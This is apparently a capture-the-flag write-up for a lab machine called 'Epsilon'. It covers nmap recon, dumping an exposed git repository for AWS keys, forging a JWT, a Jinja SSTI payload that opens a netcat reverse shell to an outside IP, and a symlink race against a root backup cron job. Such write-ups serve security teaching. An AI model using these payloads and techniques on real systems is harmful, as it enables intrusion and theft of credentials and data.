# Epsilon

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.96.151 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 10:29 EST
Nmap scan report for 10.129.96.151
Host is up (0.024s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
```

Port 80 leads to a deadend, so we can visit port 5000 instead. I did a detailed `nmap` scan to further check what was present, and found a `.git` repository on port 80.

```
$ sudo nmap -p 22,80,5000 -sC -sV -O -T4 10.129.96.151   
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 10:32 EST
Nmap scan report for 10.129.96.151
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
| http-git: 
|   10.129.96.151:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
```

### Port 5000

Port 5000 presented a login page with some cool art:

<figure><img src="../../../.gitbook/assets/image (1668).png" alt=""><figcaption></figcaption></figure>

This was a Werkzeug application, which indicates it might be running Flask. The login function presented nothing of interest.

### Gitdumper

I used `git-dumper` to download all the files from this repository.

{% embed url="https://github.com/arthaud/git-dumper" %}

```bash
git_dumper.py http://10.129.86.151/.git .
```

This downloaded 2 files, a `server.py` and a `track_api_CR_148.py`. It was in the track script that I found this:

```python
session = Session(
    aws_access_key_id='<aws_access_key_id>',
    aws_secret_access_key='<aws_secret_access_key>',
    region_name='us-east-1',
    endpoint_url='http://cloud.epsilon.htb')
aws_lambda = session.client('lambda')
```

So there's a hidden host present there. To dig deeper, we can read the logs of this repository to hopefully find the secret keys that have been removed. Reading the logs helped me find these tokens:

```
aws_access_key_id='AQLA5M37BDN6FJP76TDC'
aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
region_name='us-east-1'
```

### AWS Lambda -> Token Forgery

Now, we have some secret keys and some additional information. Searching about how to interact with this AWS instance using a CLI brought this resource up:

{% embed url="https://aws.amazon.com/cli/" %}

We would have to install `awscli` on our machine and configure it to use the tokens and stuff found in the .git repository. This page was helpful in learning how to enumerate such machines.

{% embed url="https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting/aws-services/aws-lambda-enum" %}

Once we have it running, we can set up a new profile:

```
$ aws configure
AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]:
```

Then we can find out the functions that we have access to.

```
$ aws lambda list-functions --endpoint http://cloud.epsilon.htb
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2023-03-07T15:28:42.599+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "2f4975b6-3487-4826-95e3-fd90ff03f598",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

It appears we have access to some function called `costume_shop_v1`, which is probably the service running on port 80. We can enumerate further via `get-function`.

```
$ aws lambda get-function --function-name 'costume_shop_v1' --endpoint http://cloud.epsilon.htb

{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2023-03-07T15:28:42.599+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "2f4975b6-3487-4826-95e3-fd90ff03f598",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}

```

When we visit that `Location` URL, we will download a `lambda_archive.zip` file. Within the zip file was a Python script that contained this:

```python
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }

```

I didn't really know what the code was doing, but I do know that the `secret` parameter is probably what we need to forge a token to gain access as the user. Within the git repository earlier, we can see there's an `auth` JWT token being accepted.

```python
@app.route("/", methods=["GET","POST"])
def index():
	if request.method=="POST":
		if request.form['username']=="admin" and request.form['password']=="admin":
			res = make_response()
			username=request.form['username']
			token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
			res.set_cookie("auth",token)
			res.headers['location']='/home'
			return res,302
		else:
			return render_template('index.html')
	else:
		return render_template('index.html')
```

With this secret, we can forge a cookie easily. I used jwt.io to create a token easily.

<figure><img src="../../../.gitbook/assets/image (2947).png" alt=""><figcaption></figcaption></figure>

Afterwards, when trying to visit the webpage, we are granted access.

<figure><img src="../../../.gitbook/assets/image (828).png" alt=""><figcaption></figcaption></figure>

### SSTI

When reading the source code for the application, we can find the `/order` endpoint function:

```python
@app.route('/order',methods=["GET","POST"])
def order():
	if verify_jwt(request.cookies.get('auth'),secret):
		if request.method=="POST":
			costume=request.form["costume"]
			message = '''
			Your order of "{}" has been placed successfully.
			'''.format(costume)
			tmpl=render_template_string(message,costume=costume)
			return render_template('order.html',message=tmpl)
		else:
			return render_template('order.html')
	else:
		return redirect('/',code=302)
```

It seems that this uses `render_template` to process the order that has been placed. This function is vulnerable to SSTI. We can view the post request in Burpsuite:

```http
POST /order HTTP/1.1
Host: 10.129.96.151:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://10.129.96.151:5000
Connection: close
Referer: http://10.129.96.151:5000/order
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.SYLPqHmtbgIzpOiaVnKoifTOeTuOBMPy5adK8v0DD6E
Upgrade-Insecure-Requests: 1



costume=goggles&q=test&addr=test
```

A quick test reveals the `costume` parameter to be the injection point using `{{config.items()}}`.

<figure><img src="../../../.gitbook/assets/image (2610).png" alt=""><figcaption></figcaption></figure>

Here's a payload I used that got me a reverse shell:

```
{{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.39%204444%20%3E%2Ftmp%2Ff').read()+}}
```

<figure><img src="../../../.gitbook/assets/image (1941).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Symlink Exploit

We can echo our public key into the `~/.ssh/authorized_keys` folder, then run `chmod 600 authorized_keys` and `chmod 700 .ssh` to upgrade our shell and SSH in as the user.

I ran a `pspy64` on the machine tos ee if there were any exploitable cron jobs running. Here are a few:

```
2023/03/07 16:45:01 CMD: UID=0    PID=3461   | /bin/bash /usr/bin/backup.sh 
2023/03/07 16:45:01 CMD: UID=0    PID=3464   | /usr/bin/tar -cvf /opt/backups/967155677.tar /var/www/app/                                                                                 
2023/03/07 16:45:01 CMD: UID=0    PID=3466   | /bin/bash /usr/bin/backup.sh 
2023/03/07 16:45:01 CMD: UID=0    PID=3465   | sha1sum /opt/backups/967155677.tar 
2023/03/07 16:45:01 CMD: UID=0    PID=3467   | sleep 5
```

So there's a backup script being run by root. Here's the `backup.sh` script being used:

```bash
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```

The weird part about this script is the `/opt/backups/checksum` file and the sleep 5 in between, almost as if it's to give us time to execute something. Upon checking my permissions, it seems that I am able to create files within the `/opt/backups` folder.&#x20;

One possible exploit is to replace the file with a symlink to another file. In this machine's case, we can replace the `checksum` file with a symlink to the `/root` folder.

We just need to create a bash loop to wait for this file to pop up and execute some arbitrary commands. I just did `rm -f checksum; ln -s /root checksum` a bunch of times until it worked. When viewing the `/var/backups/web_backups` directory, we wouuld find one .tar file larger than the rest:

```
tom@epsilon:/var/backups/web_backups$ ls -la
total 80428
drwxr-xr-x 2 root root     4096 Mar  7 16:57 .
drwxr-xr-x 3 root root     4096 Mar  7 15:57 ..
-rw-r--r-- 1 root root  1003520 Mar  7 16:55 275431893.tar
-rw-r--r-- 1 root root  1003520 Mar  7 16:56 304784060.tar
-rw-r--r-- 1 root root 80343040 Mar  7 16:57 334180138.tar
```

When we open the file, there would be a `checksum` directory:

```
tom@epsilon:~/opt/backups$ ls -la
total 988
drwxrwxr-x 4 tom tom   4096 Mar  7 16:59 .
drwxrwxr-x 3 tom tom   4096 Mar  7 16:58 ..
-rw-r--r-- 1 tom tom 993280 Mar  7 16:57 320422014.tar
drwx------ 9 tom tom   4096 Mar  7 15:29 checksum
drwxrwxr-x 3 tom tom   4096 Mar  7 16:59 var
```

And within that directory is the `/root` directory with private SSH keys.

```
tom@epsilon:~/opt/backups/checksum$ ls -la
total 60
drwx------  9 tom tom 4096 Mar  7 15:29 .
drwxrwxr-x  4 tom tom 4096 Mar  7 16:59 ..
drwxr-xr-x  2 tom tom 4096 Dec 20  2021 .aws
-rw-r--r--  1 tom tom 3106 Dec  5  2019 .bashrc
drwx------  4 tom tom 4096 Dec 20  2021 .cache
drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .config
-rw-r--r--  1 tom tom  356 Nov 17  2021 docker-compose.yml
-rw-r--r--  1 tom tom   33 Nov 17  2021 .gitconfig
-rwxr-xr-x  1 tom tom  453 Nov 17  2021 lambda.sh
drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .local
drwxr-xr-x 39 tom tom 4096 Mar  7 15:28 .localstack
-rw-r--r--  1 tom tom  161 Dec  5  2019 .profile
-rw-r-----  1 tom tom   33 Mar  7 15:29 root.txt
drwxr-xr-x  2 tom tom 4096 Dec 20  2021 src
drwx------  2 tom tom 4096 Dec 20  2021 .ssh
```

We can easily get a root shell via SSH.

<figure><img src="../../../.gitbook/assets/image (1520).png" alt=""><figcaption></figcaption></figure>
